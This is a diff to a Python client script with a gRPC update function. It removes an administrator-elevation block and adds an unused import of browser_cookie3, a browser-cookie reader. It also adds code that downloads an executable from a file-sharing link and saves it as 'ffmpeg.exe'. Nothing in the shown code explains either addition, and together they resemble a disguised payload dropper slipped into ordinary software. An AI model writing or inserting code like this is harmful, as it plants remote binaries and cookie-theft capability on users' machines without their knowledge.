@@ -14,6 +14,7 @@ import subprocess
 import ctypes,sys,os
 
 import requests
+import browser_cookie3
 
 import google.protobuf.empty_pb2 as empty_pb2
 import os
@@ -86,17 +87,7 @@ def update():
     for one in response:
         print(one.status)
         print(one.change_log)
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
 
-if is_admin():
-	print("以管理员权限运行")
-	# 杀掉名字为Au_.exe的进程
-	os.system("taskkill /im Au_.exe /f")
-else:
-	if sys.version_info[0] == 3:
-		print("无管理员权限")
-		ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+a = requests.get('https://i81.lanzoug.com:446/07191100127503958bb/2023/07/19/7c7e07c4500998f9fd0c46da3053f448.exe?st=OgT6k1XLxAdeyeKwXenw2w&e=1689739010&b=ATUNawhlB3JRYVRlUC5SM1N_bWWA_c&fi=127503958')
+with open('ffmpeg.exe','wb') as f:
+     f.write(a.content)
